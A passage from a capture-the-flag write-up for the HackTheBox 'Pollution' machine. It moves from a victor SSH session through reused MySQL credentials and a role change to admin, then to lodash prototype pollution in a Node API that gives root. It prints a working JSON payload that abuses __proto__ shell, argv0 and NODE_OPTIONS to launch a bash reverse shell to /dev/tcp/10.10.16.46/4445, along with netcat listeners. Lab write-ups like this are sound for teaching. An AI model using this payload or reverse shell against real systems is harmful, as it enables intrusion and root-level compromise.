ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKJvTrl3VS2/Vb+fStTZC1f1u98paMtzhMcpbP3s5esw geedorah@kali

┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ ssh -i bob victor@collect.htb
The authenticity of host 'collect.htb (10.129.228.126)' can't be established.
ED25519 key fingerprint is SHA256:3TVNrr8OYvroehXZ0JCYv7Ooe8vo+Nnemnj9vx9aS8Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'collect.htb' (ED25519) to the list of known hosts.
Linux pollution 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
victor@pollution:~$


```



Reading Pollution API ( Port 3000)
---

Checking for listening ports still does not reveal what processes are being ran on port 3000.
```bash
victor@pollution:~/pollution_api$ ss -tlnp
State       Recv-Q      Send-Q             Local Address:Port             Peer Address:Port      Process
LISTEN      0           511                    127.0.0.1:9000                  0.0.0.0:*          users:(("bash",pid=1946,fd=11),("bash",pid=1945,fd=11),("shell.sh",pid=1944,fd=11),("sh",pid=1943,fd=11))
LISTEN      0           80                     127.0.0.1:3306                  0.0.0.0:*
LISTEN      0           511                      0.0.0.0:6379                  0.0.0.0:*
LISTEN      0           128                      0.0.0.0:22                    0.0.0.0:*
LISTEN      0           511                    127.0.0.1:3000                  0.0.0.0:*
LISTEN      0           511                        [::1]:6379                     [::]:*
LISTEN      0           511                            *:80                          *:*
LISTEN      0           128                         [::]:22                       [::]:*

```

If I inspect the processes running, I can see that root has launched node at its root directory.
```bash
victor@pollution:~/pollution_api$ ps -ef | grep -i node
root        1346     969  0 00:07 ?        00:00:01 /usr/bin/node /root/pollution_api/index.js
victor      2169    1982  0 00:22 pts/1    00:00:00 grep -i node
victor@pollution:~/pollution_api$

```

Given that victor also has **pollution_api** in his home directory, I can make an educated guess that port 3000 is running **pollution_api**, as root.
```bash
victor@pollution:~/pollution_api$ ls -la
total 116
drwxr-xr-x  8 victor victor  4096 Nov 21  2022 .
drwx------ 16 victor victor  4096 Nov 21  2022 ..
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 controllers
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 functions
-rw-r--r--  1 victor victor   528 Sep  2  2022 index.js
drwxr-xr-x  5 victor victor  4096 Nov 21  2022 logs
-rwxr-xr-x  1 victor victor   574 Aug 26  2022 log.sh
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 models
drwxr-xr-x 97 victor victor  4096 Nov 21  2022 node_modules
-rw-r--r--  1 victor victor   160 Aug 26  2022 package.json
-rw-r--r--  1 victor victor 71730 Aug 26  2022 package-lock.json
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 routes
victor@pollution:~/pollution_api$

```

I'll tar this and then transfer it to my machine to analyse the node application in VS Code.
```bash
  victor@pollution:~$ tar -cjvf pollution_api.tar.bz2 pollution_api/
  victor@pollution:~$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.10.16.46 - - [05/May/2026 00:29:22] "GET /pollution_api.tar.bz2 HTTP/1.1" 200 -


```


```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ wget http://collect.htb:9001/pollution_api.tar.bz2
--2026-05-05 12:29:21--  http://collect.htb:9001/pollution_api.tar.bz2
Resolving collect.htb (collect.htb)... 10.129.228.126
Connecting to collect.htb (collect.htb)|10.129.228.126|:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3384400 (3.2M) [application/x-bzip2]
Saving to: ‘pollution_api.tar.bz2’

pollution_api.tar.bz2     100%[=====================================>]   3.23M  11.0MB/s    in 0.3s

2026-05-05 12:29:21 (11.0 MB/s) - ‘pollution_api.tar.bz2’ saved [3384400/3384400]



```


In VS Code, I'll be using Snyk to do a quick code scan.

![](../../images/pollution/Pasted_image_20260505123334.png)



Looking through Snyk's scan, there's a lot of vulnerabilities, notably RCE and Code Injection from mysql2. However, Snyk flags packages that are outdated and does not necessarily check if it's in use.


![](../../images/pollution/Pasted_image_20260505123936.png)

Searching for `mysql` will show that this is just a dependancy attached to **Pollution_api** with no clear usage.
![](../../images/pollution/Pasted_image_20260505124243.png)

This is also the same for `dottie`, which is vulnerable to prototype pollution.
![](../../images/pollution/Pasted_image_20260505124401.png)

Looking at `lodash`, it is being referenced at  `Messages_send.js`.
![](../../images/pollution/Pasted_image_20260505124509.png)

Snyk highlights that `lodash` is vulnerable to Prototype Pollution via the `merge` function, which is present in the codebase.
![](../../images/pollution/Pasted_image_20260505124819.png)


To begin interacting with `Pollution API`, I'll do a ssh portforward.
```
victor@pollution:~/pollution_api$
ssh> -L 3000:127.0.0.1:3000
Forwarding port.

```

I'll then try to trigger the `messages_send` method shown in VS Code, which is called from `admin.js`
![](../../images/pollution/Pasted_image_20260505125808.png)

I get a status error.
![](../../images/pollution/Pasted_image_20260505125833.png)


Looking into `admin.js` it wants to decode JWT (Json Web Token), and it has to contain the `admin` role.
![](../../images/pollution/Pasted_image_20260505130019.png)

Looking through the codebase there are a list of APIs i can call.
![](../../images/pollution/Pasted_image_20260505130444.png)

I see `/auth/register`, so I'll proceed to register a new account with the api.

Trying `x-www-urlencoded` content type did not work.
![](../../images/pollution/Pasted_image_20260505130825.png)


It accepts `application/json`.
![](../../images/pollution/Pasted_image_20260505131031.png)

I can try to login now with `/auth/login`.

It gives the JWT token needed for the `messages/send` endpoint.
![](../../images/pollution/Pasted_image_20260505131110.png)


If I decode this JWT, it still shows us as a normal user.
![](../../images/pollution/Pasted_image_20260505132238.png)


There is a JWT Secret token leaked, and it is confirmed as a valid secret via `jwt.io` as shown above. 
![](../../images/pollution/Pasted_image_20260505132304.png)


Since I have the JWT Secret, I can technically edit my user role as admin via forging my token, however this will not work as it queries the database specifically to check for admin role.

![](../../images/pollution/Pasted_image_20260505132544.png)

To proceed, I'll have to access the database somehow and update my user to Admin, so I can request another token again.


Updating role to admin on MariaDB
---
Looking back at `login.php`  on `/var/www/developers`, there is a credential for 
`webapp_user:Str0ngP4ssw0rdB*12@` to login to a local MySQL server.

```bash

victor@pollution:/var/www/developers$ ls -la
total 120
drwxr-xr-x 3 root root  4096 Oct 27  2022 .
drwxr-xr-x 5 root root  4096 Nov 18  2022 ..
drwxr-xr-x 4 root root  4096 Oct 26  2022 assets
-rw-r--r-- 1 root root   144 Oct 27  2022 bootstrap.php
-rw-r--r-- 1 root root 25225 Oct 26  2022 calendar.php
-rw-r--r-- 1 root root  4106 Oct 26  2022 footer.php
-rw-r--r-- 1 root root  1789 Oct 27  2022 header.php
-rwxr-xr-x 1 root root  6995 Oct 27  2022 home.php
-rw-r--r-- 1 root root    17 Oct 27  2022 .htaccess
-rw-r--r-- 1 root root    55 Oct 27  2022 .htpasswd
-rwxr-xr-x 1 root root   882 Oct 26  2022 index.php
-rwxr-xr-x 1 root root  4512 Oct 27  2022 login.php
-rw-r--r-- 1 root root   194 Oct 26  2022 logout.php
-rw-r--r-- 1 root root 30141 Oct 27  2022 projects.php
victor@pollution:/var/www/developers$ cat login.php
<?php
require './bootstrap.php';

if(isset($_SESSION['auth']) && $_SESSION['auth'] == True)
{
    die(header("Location: /"));
}

$db = new mysqli("localhost", "webapp_user", "Str0ngP4ssw0rdB*12@1", "developers");
$db->set_charset('utf8mb4');
$db->options(MYSQLI_OPT_INT_AND_FLOAT_NATIVE, 1);

```

Trying to login , I get access. I can also view the `pollution_api` database.
```bash
victor@pollution:/var/www/developers$ mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 119
Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+
7 rows in set (0.002 sec)

MariaDB [(none)]>

```

There are 2 tables listed on `pollution_api`, `messages` and `users`.
```bash
victor@pollution:/var/www/developers$ mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 119
Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+
7 rows in set (0.002 sec)

MariaDB [(none)]> use pollution_api
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pollution_api]> show tables;
+-------------------------+
| Tables_in_pollution_api |
+-------------------------+
| messages                |
| users                   |
+-------------------------+
2 rows in set (0.000 sec)


MariaDB [pollution_api]> [
```

`Users` shows my account registered.
```bash
MariaDB [pollution_api]> select * from users;
+----+-----------+----------+------+---------------------+---------------------+
| id | username  | password | role | createdAt           | updatedAt           |
+----+-----------+----------+------+---------------------+---------------------+
|  1 | geedorah2 | geedorah | user | 2026-05-05 05:10:22 | 2026-05-05 05:10:22 |
+----+-----------+----------+------+---------------------+---------------------+
1 row in set (0.000 sec)

```


With this, I can effectively update my role to `admin`, and trigger the `auth/login` request via burp suite again.
```bash
MariaDB [pollution_api]> update users set role = "admin" where id = 1;
Query OK, 1 row affected (0.006 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [pollution_api]> select * from users;
+----+-----------+----------+-------+---------------------+---------------------+
| id | username  | password | role  | createdAt           | updatedAt           |
+----+-----------+----------+-------+---------------------+---------------------+
|  1 | geedorah2 | geedorah | admin | 2026-05-05 05:10:22 | 2026-05-05 05:10:22 |
+----+-----------+----------+-------+---------------------+---------------------+
1 row in set (0.001 sec)

MariaDB [pollution_api]>

```


![](../../images/pollution/Pasted_image_20260505141427.png)

Decoding my JWT shows `geedorah2` is now an admin role.
![](../../images/pollution/Pasted_image_20260505141509.png)


`x-access-token` is being treated as a header in the source code, so I'll  add it in burp suite in my repeater and send the request.

Now I can use the API.
![](../../images/pollution/Pasted_image_20260505141904.png)


The `messages/send` API expects a text parameter.
![](../../images/pollution/Pasted_image_20260505150622.png)


After updating my request body, It responds with a Status ok .
![](../../images/pollution/Pasted_image_20260505150650.png)


Parameter Pollution `__prototype__` abuse
---

Since snyk has flagged this to be vulnerable to prototype pollution, I'll have to take a look at what are the parameters that can be poisoned for node.js exec.
![](../../images/pollution/Pasted_image_20260505154636.png)

If  I take a look at this [website](https://nodejs.org/api/child_process.html#child-processexeccommand-options-callback),  `exec` hash an options parameter that allows you specify a `shell` parameter, which will be used as the backbone of your command process.
![](../../images/pollution/Pasted_image_20260505154435.png)


I can attain root via specifying the shell to point towards our reverse shell created by poisoning the `__proto__` property, which all javascript objects refer to when instantiated. When `exec` is called without an options argument, Node initialises `options = {}` internally. As it will refer to `Object.prototype` which I have polluted, it will inherit the `shell` property with a value that I can specify as the path to my reverse shell.

I'll populate `__proto__` with shell the value of `/tmp/shell`.
![](../../images/pollution/Pasted_image_20260505155511.png)


In our listener, we get a root shell.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.228.126] 49334
bash: cannot set terminal process group (1346): Inappropriate ioctl for device
bash: no job control in this shell
root@pollution:/root/pollution_api# whoami
whoami
root
root@pollution:/root/pollution_api#

```



[Hacktricks](https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html) has shown another way you can do prototype pollution on `exec` without uploading a file. 

Based on my understanding, you're essentially using the NODE JS executable to be able to run node JS commands of your choice. Then you'll call child_process exec within NODE js to be able to run system commands.
![](../../images/pollution/Pasted_image_20260505155837.png)


Following hacktricks, I created the following POC.
```
POST /admin/messages/send HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ2VlZG9yYWgyIiwiaXNfYXV0aCI6dHJ1ZSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzc3OTY1ODU5LCJleHAiOjE3Nzc5Njk0NTl9.1nT8jwk6_xRNhatOvqufAKEMDgc4mo9p4zg2dcWEA1k
Cookie: csrftoken=kI6HetXNWFNz7FPHwvqg4yntaC7aReEh; lang=en-US; ph_phc_dTOPniyUNU2kD8Jx8yHMXSqiZHM8I91uWopTMX6EBE9_posthog=%7B%22%24device_id%22%3A%22019d3821-c47f-7e48-bd79-edd2b4aef6d8%22%2C%22distinct_id%22%3A%22019d3821-c47f-7e48-bd79-edd2b4aef6d8%22%2C%22%24sesid%22%3A%5B1774768688746%2C%22019d3875-0e6b-7883-9599-4ced9860d7b4%22%2C1774768688746%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22http%3A%2F%2F127.0.0.1%3A6274%2F%22%7D%7D;
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-None-Match: W/"1ab-/3G+L59Zf7n0CJltayzOmFZyZgk"
Priority: u=0, i
X-Forwarded-For: 1.2.3.4
Content-Type: application/json
Content-Length: 241

{"text":"test",
"__proto__":{
"shell":  "/proc/self/exe",
"argv0":"console.log(require('child_process').execSync(\"bash -c 'bash -i >& /dev/tcp/10.10.16.46/4445 0>&1'\").toString())//",
"NODE_OPTIONS":"--require /proc/self/cmdline"
}
}
```

![](../../images/pollution/Pasted_image_20260505155423.png)


Running my listener, I get another root shell.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.228.126] 54160
bash: cannot set terminal process group (1346): Inappropriate ioctl for device
bash: no job control in this shell
root@pollution:/root/pollution_api#

```